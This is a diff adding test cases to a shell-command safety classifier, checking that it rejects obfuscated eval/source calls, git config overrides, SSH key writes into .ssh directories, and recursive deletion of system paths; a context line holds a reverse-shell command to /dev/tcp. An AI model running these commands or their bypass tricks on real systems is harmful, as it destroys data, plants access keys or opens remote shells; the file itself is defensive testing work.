@@ -1225,6 +1225,78 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("resolved-form injection detection (round 11)", () => {
+    test("x=s; y=ource; $x$y /tmp/evil.sh resolves to source — rejected", () => {
+      expect(classifyCommand("x=s; y=ource; $x$y /tmp/evil.sh").ok).toBe(false);
+    });
+
+    test("a=ev; b=al; $a$b payload resolves to eval — rejected", () => {
+      expect(classifyCommand("a=ev; b=al; $a$b whoami").ok).toBe(false);
+    });
+  });
+
+  describe("git config-file env overrides (round 11)", () => {
+    test("GIT_CONFIG_GLOBAL=/tmp/evil git pu is rejected", () => {
+      expect(classifyCommand("GIT_CONFIG_GLOBAL=/tmp/evil git pu origin main").ok).toBe(false);
+    });
+
+    test("GIT_CONFIG_SYSTEM=/tmp/evil git status is rejected", () => {
+      expect(classifyCommand("GIT_CONFIG_SYSTEM=/tmp/evil git status").ok).toBe(false);
+    });
+
+    test("HOME=/tmp/evil git pu origin main is rejected", () => {
+      expect(classifyCommand("HOME=/tmp/evil git pu origin main").ok).toBe(false);
+    });
+
+    test("XDG_CONFIG_HOME=/tmp/evil git status is rejected", () => {
+      expect(classifyCommand("XDG_CONFIG_HOME=/tmp/evil git status").ok).toBe(false);
+    });
+  });
+
+  describe("SSH home-expansion write forms (round 11)", () => {
+    test("brace-expansion error form to .ssh is rejected", () => {
+      // echo key > ${HOME:?}/.ssh/id_rsa
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR:?}
+      expect(classifyCommand("echo key > ${HOME:?}/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test("brace-expansion default form to .ssh via tee is rejected", () => {
+      // printf key | tee ${HOME:-}/.ssh/id_rsa
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR:-}
+      expect(classifyCommand("printf key | tee ${HOME:-}/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test("cp key ~root/.ssh/id_rsa is rejected (tilde-user home)", () => {
+      expect(classifyCommand("cp key ~root/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test("echo key > ~www-data/.ssh/authorized_keys is rejected", () => {
+      expect(classifyCommand("echo key > ~www-data/.ssh/authorized_keys").ok).toBe(false);
+    });
+  });
+
+  describe("rm -r on system path without -f (round 11)", () => {
+    test("rm -r /etc is rejected (no -f)", () => {
+      expect(classifyCommand("rm -r /etc").ok).toBe(false);
+    });
+
+    test("rm -R /usr is rejected (capital R)", () => {
+      expect(classifyCommand("rm -R /usr").ok).toBe(false);
+    });
+
+    test("rm --recursive /home is rejected (long form)", () => {
+      expect(classifyCommand("rm --recursive /home").ok).toBe(false);
+    });
+
+    test("rm -r /tmp/koi (workspace-scoped, allowed)", () => {
+      expect(classifyCommand("rm -r /tmp/koi").ok).toBe(true);
+    });
+
+    test("rm -r ./build (relative, allowed)", () => {
+      expect(classifyCommand("rm -r ./build").ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
